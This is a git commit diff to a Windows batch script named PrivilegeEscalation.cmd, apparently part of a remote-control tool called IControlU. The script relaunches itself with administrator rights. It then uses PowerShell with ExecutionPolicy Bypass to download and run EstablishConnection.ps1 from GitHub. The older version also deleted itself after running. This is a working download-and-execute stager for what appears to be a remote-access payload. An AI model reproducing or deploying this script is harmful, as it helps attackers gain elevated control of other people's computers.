9263d59fd7b602dd8e8ad340e4e78f6ee714f800
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-11-02 12:43:14 +0800

    Testing

--- Payload/PrivilegeEscalation.cmd
+++ Payload/PrivilegeEscalation.cmd
@@ -1,30 +1,20 @@
-@REM Script to run file as administrator
-
 @echo off
-:-------------------------------------
-if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
->nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) else (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
-if '%ERRORLEVEL%' NEQ '0' (
-    echo Getting administrative privileges...
+:: Check for admin privileges
+>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"
+
+:: If not admin, restart script as admin
+if %errorlevel% neq 0 (
+    echo Running script as administrator...
     goto UACPrompt
-) else ( goto GotAdmin )
+)
 
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\Upgrade.vbs"
-    set Params= %*
-    echo UAC.ShellExecute "cmd", "/c ""%~s0"" %Params:"=""%", "", "runas", 1 >> "%TEMP%\Upgrade.vbs"
-
-    "%temp%\Upgrade.vbs"
-    del "%temp%\Upgrade.vbs"
-    exit /B
-
-:GotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-
+:: Continue running the script
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
 PowerShell -ExecutionPolicy Bypass -File ".\EstablishConnection.ps1"
 
-del PrivilegeEscalation.cmd
+:: Exit the script
+exit /b
+
+:UACPrompt
+    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
+    exit /b
